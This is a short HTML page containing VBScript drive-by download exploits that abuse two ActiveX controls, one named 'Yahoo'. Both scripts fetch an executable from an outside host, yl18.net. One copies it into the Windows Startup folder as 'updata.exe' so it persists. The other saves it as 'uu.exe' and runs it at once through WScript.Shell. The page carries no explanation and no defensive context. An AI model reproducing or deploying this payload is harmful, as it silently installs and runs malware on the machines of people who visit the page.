<object classid='clsid:F685AFD8-A5CC-410E-98E4-BAA1C559BA61' id='test'></object>

<script language='vbscript'>
  Sub tryMe
   On Error Resume Next
     test.HttpDownloadFile "http://www.yl18.net/a2.exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\updata.exe"

  End Sub
</script>


<object classid='clsid:24F3EAD6-8B87-4C1A-97DA-71C126BDA08F' id='Yahoo'></object>
<script language='vbscript'>
    Yahoo.GetFile "http://www.yl18.net/a2.exe","c:\\uu.exe",5,1,"tiany"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run"uu.exe"
</script>  
 